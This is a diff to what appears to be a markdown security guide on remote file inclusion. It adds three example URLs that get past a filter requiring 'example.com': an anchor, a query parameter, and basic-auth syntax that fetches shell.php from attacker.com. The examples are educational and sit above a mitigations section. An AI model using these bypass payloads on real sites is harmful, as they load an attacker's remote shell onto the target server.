@@ -88,6 +88,21 @@ https://example.com/login.php?language=https://example.com/lang/english.php
 https://example.com/login.php?language=english.php
 ```
 
+#### Example
+
+`https://example.com/lang/english.php`
+
+Filter requires example.com being in the string
+
+1. `https://example.com/shell.php#example.com`  (# as anchor)
+
+2. `https://example.com/shell.php?add=https://example.com`
+
+3. `https://example.com:hello@attacker.com/shell.php`  (basic authentication)
+   * Username is example.com and password is hello, sending it to attacker.com
+
+
+
 #### Mitigations
 
 * Sanitise user input
